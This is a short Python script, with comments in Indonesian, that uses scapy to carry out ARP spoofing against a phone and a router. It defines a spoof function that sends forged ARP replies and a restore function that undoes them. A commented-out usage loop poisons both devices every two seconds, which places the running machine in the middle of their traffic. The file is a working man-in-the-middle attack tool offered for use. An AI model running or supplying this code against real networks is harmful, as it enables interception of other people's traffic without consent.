from scapy.all import ARP, send
import time

def spoof(target_ip, spoof_ip):
    # target_ip = IP HP 
    # spoof_ip = IP Router
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    # Mengembalikan jaringan ke normal saat selesai
    packet = ARP(op=2, pdst=destination_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=source_ip)
    send(packet, count=4, verbose=False)

# Contoh penggunaan (Jalankan di terminal terpisah)
# target = "192.xxx.xxx.xxx" (IP HP )
# router = "192.xxx.xxx.xxx" (IP Router)
# try:
#     while True:
#         spoof(target, router)
#         spoof(router, target)
#         time.sleep(2)
# except KeyboardInterrupt:
#     restore(target, router)